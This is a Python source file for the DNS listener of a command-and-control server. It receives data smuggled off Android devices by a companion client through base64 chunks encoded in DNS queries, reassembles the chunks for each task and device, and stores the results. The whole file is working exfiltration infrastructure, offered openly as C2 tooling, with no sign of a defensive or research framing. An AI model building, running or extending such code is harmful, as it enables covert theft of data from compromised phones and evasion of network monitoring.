"""
DNS-based C2 exfiltration receiver.

Receives data exfiltrated via DNS A-queries from the Android client
(DnsExfiltrator.kt). Each query encodes one base64 chunk of the payload.

Query format:
  <b64_chunk>.<seq_3digit>.<task_uuid>.<device_name>.c2
  end.<total_3digit>.<task_uuid>.<device_name>.c2

The server reassembles chunks keyed by (task_uuid, device_name), base64-decodes
the payload, and calls handler.store_result() to persist it alongside HTTP results.
"""

import base64
import logging
import threading
from collections import defaultdict
from typing import Any

from dnslib import A, QTYPE, RR
from dnslib.server import BaseResolver, DNSServer

logger = logging.getLogger("c2-server.dns")

_DOMAIN_SUFFIX = ".c2"


class C2DnsResolver(BaseResolver):
    """Parses exfiltration queries and reassembles chunked payloads."""

    def __init__(self, command_handler: Any) -> None:
        self.handler = command_handler
        # pending_chunks[(task_id, device_name)] = {seq_int: chunk_str}
        self.pending_chunks: dict = defaultdict(dict)

    def resolve(self, request: Any, handler_ref: Any) -> Any:  # type: ignore[override]
        reply = request.reply()
        qname = str(request.q.qname).rstrip(".")

        # Always respond with a dummy A record so the client doesn't time out.
        reply.add_answer(
            RR(request.q.qname, QTYPE.A, rdata=A("1.2.3.4"), ttl=1)
        )

        if not qname.endswith(_DOMAIN_SUFFIX):
            return reply

        # Strip ".c2" and split into labels
        inner = qname[: -len(_DOMAIN_SUFFIX)]
        parts = inner.split(".")
        # Expected: [chunk_or_end, seq, task_id, device_name]
        if len(parts) < 4:
            return reply

        marker = parts[0]
        seq_str = parts[1]
        task_id = parts[2]
        device_name = parts[3]
        key = (task_id, device_name)

        try:
            if marker == "end":
                total = int(seq_str)
                self._reassemble(key, total)
            else:
                seq = int(seq_str)
                self.pending_chunks[key][seq] = marker
                logger.debug(
                    "DNS chunk received: task=%s seq=%d device=%s",
                    task_id[:8],
                    seq,
                    device_name,
                )
        except (ValueError, Exception) as exc:
            logger.warning("DNS parse error for '%s': %s", qname, exc)

        return reply

    def _reassemble(self, key: tuple, total: int) -> None:
        task_id, device_name = key
        chunk_map = self.pending_chunks.pop(key, {})

        if len(chunk_map) != total:
            logger.warning(
                "DNS reassembly incomplete: got %d/%d chunks for task=%s",
                len(chunk_map),
                total,
                task_id[:8],
            )
            return

        b64 = "".join(chunk_map[i] for i in range(total))
        try:
            data_str = base64.b64decode(b64.encode()).decode("utf-8")
        except Exception as exc:
            logger.error("DNS base64 decode failed for task=%s: %s", task_id[:8], exc)
            return

        logger.info(
            "DNS exfil complete: task=%s device=%s payload_len=%d",
            task_id[:8],
            device_name,
            len(data_str),
        )
        self.handler.store_result(
            task_id=task_id,
            device_name=device_name,
            data={"output": data_str},
            success=True,
        )


def start_dns_server(command_handler: Any, port: int = 5300) -> None:
    """Start the DNS exfiltration listener in a background daemon thread."""
    try:
        resolver = C2DnsResolver(command_handler)
        server = DNSServer(resolver, port=port, address="0.0.0.0", tcp=False)
        thread = threading.Thread(
            target=server.start,
            daemon=True,
            name="dns-c2-listener",
        )
        thread.start()
        logger.info("DNS C2 listener started on UDP 0.0.0.0:%d", port)
    except Exception as exc:
        logger.error("Failed to start DNS listener on port %d: %s", port, exc)
        logger.error("Hint: port 53 requires root. Use DNS_LISTENER_PORT=5300 in config.py.")
